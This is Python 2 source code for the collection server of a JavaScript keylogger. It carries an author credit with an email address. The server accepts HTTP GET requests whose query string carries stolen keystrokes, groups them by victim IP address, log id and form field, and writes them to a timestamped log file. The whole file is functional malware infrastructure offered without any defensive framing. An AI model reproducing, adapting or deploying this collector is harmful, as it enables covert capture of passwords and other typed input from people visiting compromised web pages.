# John Leitch - john.leitch5@gmail.com
import sys, asyncore, socket, re, time, threading

from datetime import datetime

class keylogger_server(asyncore.dispatcher):

    host = '127.0.0.1'
    port = 5230
    server_type = 'jsklserver'
    keystroke_field = 'k'
    keystrokes = {}
    keystroke_lock = threading.Lock()
    file_name = ''

    def __init__(self):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind((self.host, self.port))
        self.listen(2)
        self.file_name = str(time.time()) + '.log'
        print 'listening'

    def handle_accept(self):
        client = self.accept()
        client[0].setblocking(1)

        #print 'client accepted'

        recvBuffer = client[0].recv(8129)

        #print 'request received'

        query_string = re.search(u'GET\s+([^?])*\?(.*)\s+HTTP/\d.\d', recvBuffer)

        k = self.keystroke_field + '='
        
        if query_string != None and query_string.group(2).startswith(k):
            values = query_string.group(2)[len(k):].rsplit(',')

            c = client[1][0]

            if len(values[0]) == 3:
                values[0] = chr(int(values[0][1:], 16))

            self.keystroke_lock.acquire()

            if self.keystrokes.has_key(c):
                if self.keystrokes[c].has_key(values[2]):
                    if self.keystrokes[c][values[2]].has_key(values[1]):
                        self.keystrokes[c][values[2]][values[1]] += values[0]
                    else:
                        self.keystrokes[c][values[2]][values[1]] = values[0]
                else:
                    self.keystrokes[c][values[2]] = { values[1] : values[0] }
            else:
                self.keystrokes[c] = { values[2] : { values[1] : values[0] } }

            key_report = '';

            for host in self.keystrokes.keys():
                key_report += host + '\n'
                for log_id in self.keystrokes[host].keys():
                    key_report += '\t' + log_id + '\n'
                    for field in self.keystrokes[host][log_id].keys():
                        key_report += '\t\t' + field + ': ' + self.keystrokes[host][log_id][field] + '\n'
                
            file = open(self.file_name, 'w')
            file.write(key_report)
            file.close()

            print '.',

            self.keystroke_lock.release()

        sendBuffer = 'HTTP/1.1 200 OK\r\n\
        Date: ' + datetime.now().strftime('%a, %d %b %Y %H:%M') + '\r\n\
        Connection: close\r\n\
        Server: ' + self.server_type + '\r\n\
        AcceptRanges: bytes\r\n\
        Content-Type: text/html\r\n\
        Content-Length: 0\r\n\r\n'

        client[0].send(sendBuffer)

        #print 'response sent'

        client[0].close()

        #print 'socket closed'         

try:
    while 1:        
        server = keylogger_server()
        asyncore.loop()        
except Exception:
    print "Error: ", sys.exc_info()    
